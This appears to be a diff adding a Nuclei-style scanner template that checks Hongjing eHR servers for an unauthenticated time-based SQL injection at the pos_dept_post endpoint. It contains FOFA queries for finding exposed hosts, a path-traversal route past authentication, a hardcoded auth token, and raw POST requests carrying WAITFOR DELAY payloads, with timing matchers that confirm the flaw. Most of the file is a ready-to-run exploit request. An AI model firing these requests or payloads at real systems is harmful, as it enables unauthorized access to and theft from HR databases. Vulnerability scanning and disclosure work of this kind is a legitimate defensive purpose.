@@ -1,0 +1,44 @@
+id: Hongjing-pos_dept_post-sql-injection
+
+info:
+  name: 宏景-eHR pos_dept_post SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
+    宏景eHR pos_dept_post接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+  reference:
+    - 
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        usertable=h00&i9999=1';WAITFOR DELAY '0:0:4'--+
+
+      - |
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        usertable=h00&i9999=1';WAITFOR DELAY '0:0:8'--+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
+      - type: status
+        status: 
+          - 200
+
